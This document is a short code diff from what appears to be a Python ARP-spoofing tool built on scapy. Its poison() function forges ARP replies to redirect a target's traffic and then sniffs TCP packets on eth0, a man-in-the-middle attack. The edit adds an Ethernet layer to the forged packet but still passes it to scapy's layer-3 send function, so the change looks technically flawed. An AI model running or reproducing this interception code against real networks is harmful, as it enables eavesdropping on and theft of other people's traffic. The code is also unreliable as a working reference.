@@ -26,9 +26,10 @@ def poison(args):
 	spoof(args.IP_src, args.MAC_src, args.IP_target) # Tells the router // that my MAC address is linked to the target
 	scapy.sniff(iface="eth0", prn=handlePackets, filter="tcp") # Analyses traffic (Here specifically on TCP using the handlePackets() function)
 
-def spoof(target_ip, target_mac, spoof_ip): 
+def spoof(target_ip, target_mac, spoof_ip):
+	ether = scapy.Ether(dst=target_mac)
 	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # op stands for response (meaning the packet created is a response to a query), pdst = IP destination, hwdst = HardWare (MAC address) destination, psrc = IP source...
-	scapy.send(packet, verbose = False)
+	scapy.send(ether / packet, verbose = False)
 
 def isValidMacAddress(mac):
 	mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
